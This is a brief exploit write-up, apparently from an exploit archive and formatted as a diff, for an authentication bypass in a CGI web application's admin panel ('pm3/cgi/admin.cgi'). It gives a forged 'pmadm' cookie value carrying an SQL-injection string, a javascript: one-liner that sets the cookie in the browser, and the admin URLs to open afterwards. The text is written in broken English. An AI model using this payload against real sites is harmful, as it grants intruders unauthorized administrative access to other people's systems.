@@ -1,0 +1,36 @@
+
+desc:
+
+normal login for cookie
+
+pmadm=dGVzdA;
+
+if Ã½ do this:
+
+pmadm=dGVzd(write any thing);
+
+example:
+
+pmadm=dGVzdz;  
+
+or
+
+pmadm=dGVzd123231212313;
+
+not login 
+
+if Ã½ do wthis:
+
+pmadm=dGVzd &#039; or &#039;;
+
+boom this loggin :D
+
+exp:
+
+javascript:document.cookie = &quot;pmadm=dGVzd &#039; or &#039;; path=/&quot;;
+
+after you go here:
+
+http://www.example.com/pm3/cgi/admin.cgi?action=edittemp
+
+or http://www.example.com/pm3/cgi/admin.cgi?action=users
